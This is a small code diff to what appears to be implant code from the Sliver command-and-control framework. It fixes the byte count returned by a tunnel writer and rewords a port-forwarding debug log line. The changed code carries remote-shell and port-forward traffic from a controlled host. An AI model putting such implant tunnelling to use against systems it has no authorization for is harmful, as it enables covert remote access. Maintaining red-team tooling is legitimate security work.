@@ -133,21 +133,22 @@ type tunnelWriter struct {
 	conn *transports.Connection
 }
 
-func (tw tunnelWriter) Write(data []byte) (n int, err error) {
-	data, err = proto.Marshal(&sliverpb.TunnelData{
+func (tw tunnelWriter) Write(data []byte) (int, error) {
+	n := len(data)
+	data, err := proto.Marshal(&sliverpb.TunnelData{
 		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
 		TunnelID: tw.tun.ID,
 		Data:     data,
 	})
 	// {{if .Config.Debug}}
-	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d)", len(data), tw.tun.WriteSequence)
+	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d)", n, tw.tun.WriteSequence)
 	// {{end}}
 	tw.tun.WriteSequence++ // Increment write sequence
 	tw.conn.Send <- &sliverpb.Envelope{
 		Type: sliverpb.MsgTunnelData,
 		Data: data,
 	}
-	return len(data), err
+	return n, err
 }
 
 func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
@@ -312,7 +313,7 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 			}
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[portfwd] Tunnel read error", err)
+				log.Printf("[portfwd] Tunnel copy error", err)
 				// {{end}}
 			}
 		}
